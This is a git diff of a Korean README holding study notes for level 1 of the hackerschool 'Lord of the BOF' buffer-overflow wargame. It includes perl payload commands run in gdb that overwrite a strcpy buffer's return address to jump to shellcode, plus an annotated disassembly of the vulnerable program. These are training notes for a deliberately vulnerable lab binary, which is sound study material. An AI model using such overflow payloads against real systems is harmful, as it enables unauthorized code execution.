@@ -10,80 +10,42 @@ Buffer Overflow기법에 대해서 공부하는 용도로 hackerschool에서 제
 - [BOF 전용 게시판](http://www.hackerschool.org/HS_Boards/zboard.php?id=bof_fellowship)
 - [BOF 다운로드](http://www.hackerschool.org/HS_Boards/zboard.php?id=bof_fellowship_2round&page=1&sn1=&divpage=1&sn=off&ss=on&sc=on&select_arrange=headnum&desc=asc&no=4)
 
-### 패스워드 확인하는 명령어
+
+### (01) LEVEL1: gate/gate
+패스워드 확인하는 명령어
 `$ my-pass`
 
- TheLordOfTheBOF_redhat
 
- 권한
+gdb 에서 esp 70개씩 보면 됨
 
-없으므로 일단 복사 후 권한 변경
+r $(perl -e 'print "a"x260 ."CCCC"')
+r $(perl -e 'print "a"x260 . "\x4c\xf9\xff\xbf"')
 
- gdb 에서
+셸코드 크기: 25바이트. "a"235만큼 채우면 됨
 
-esp 70개씩 보면 됨
+r $(perl -e 'print "SHELLCODE" . "a"x235 . "\x48\xf9\xff\xbf"')
 
- r $(perl -e 'print "a"x260 .
+SHELL CODE 시작될 주소: bf-ff-f9-48
 
-"CCCC"')
+$bash: 나오면 성공
 
- r $(perl -e 'print "a"x260 .
+$bash에서 id or whoami 입력하면 다음 레벨 id 나오고,
+$bash에서 my-pass 입력하면 비밀번호 나옴
 
-"\x4c\xf9\xff\xbf"')
+putty로 telnet 접속 방법
+`#> netconfig`
 
- 셸코드 크기: 25바이트. "a"235만큼 채우면
+유동ip설정
+`#> /sbin/ifconfig`
 
-됨.
+putty에서 입력
 
- r $(perl -e 'print "SHELL
+환경변수에서 SHELL 포함된 내용 보기
+`#> env | grep SHELL`
 
-CODE" . "a"x235 . "\x48\xf9\xff\xbf"')
+SHELL 변경
+`#> chsh` 입력 후 `/bin/bash2` 입력
 
- SHELL CODE 시작될
-
-주소:bf-ff-f9-48
-
- $bash: 나오면
-
-성공
-
- $bash에서
-
-id or whoami 입력하면 다음레벨 id 나옴,
-
- $bash에서
-
-my-pass 입력하면 비밀번호 나옴.
-
- putty로
-
-telnet 접속 방법
-
- #>netconfig
-
- ->유동ip설정
-
- #>/sbin/ifconfig
-
- putty에서
-
-입력. 
-
-환경변수에서 SHELL 포함된 내용 보기: env | grep SHELL
-
-SHELL 변경: #>chsh
-
- /bin/bash2
-
- exit후 재접속
-
- bash2로 변경
-
-후 시작.
-
- 원본
-
-바이너리 복사본으로 분석 시작!
 
   0x8048430  <main>:       push   %ebp   0x8048431  <main+1>:     mov    %ebp,%esp    0x8048433 <main+3>:     sub     %esp,0x100    0x8048439 <main+9>:     cmp     DWORD PTR [%ebp+8],1   0x804843d  <main+13>:    jg     0x8048456  <main+38>       0x804843f  <main+15>:    push   0x80484e0   0x8048444  <main+20>:    call   0x8048350  <printf>   0x8048449  <main+25>:    add    %esp,4       0x804844c  <main+28>:    push   0   0x804844e  <main+30>:    call   0x8048360  <exit>   0x8048453 <main+35>:     add    %esp,4    0x8048456 <main+38>:    mov     %eax,DWORD PTR [%ebp+12]   0x8048459  <main+41>:    add    %eax,4   0x804845c <main+44>:     mov    %edx,DWORD PTR [%eax]   0x804845e  <main+46>:    push   %edx   0x804845f <main+47>:     lea    %eax,[%ebp-256]   0x8048465  <main+53>:    push   %eax   0x8048466 <main+54>:     call   0x8048370 <strcpy>   0x804846b  <main+59>:    add    %esp,8    0x804846e <main+62>:    lea     %eax,[%ebp-256]   0x8048474  <main+68>:    push   %eax   0x8048475  <main+69>:    push   0x80484ec   0x804847a  <main+74>:    call   0x8048350  <printf>   0x804847f  <main+79>:    add    %esp,8    0x8048482 <main+82>:    leave   0x8048483  <main+83>:    ret	프롤로그                                                          스택영역  100바이트 할당     [ebp+8]은  첫번째 argument이므로 argc   if(argc <=1)        printf( "argv  error\n");   함수리턴     아래  함수의 argument   exit(0);   함수리턴     [ebp+12]는  두번째 argument이므로 *argv[0]   argv[1]     strcpy의  두번째 argument argv[1]     strcpy의  첫번재 argument &buffer[0]   strcpy(buffer,argv[1]);   함수리턴     &buffer[0]     "%s\n"   printf(""%s\n",buffer);   함수리턴     에필로그
                                           	                                        
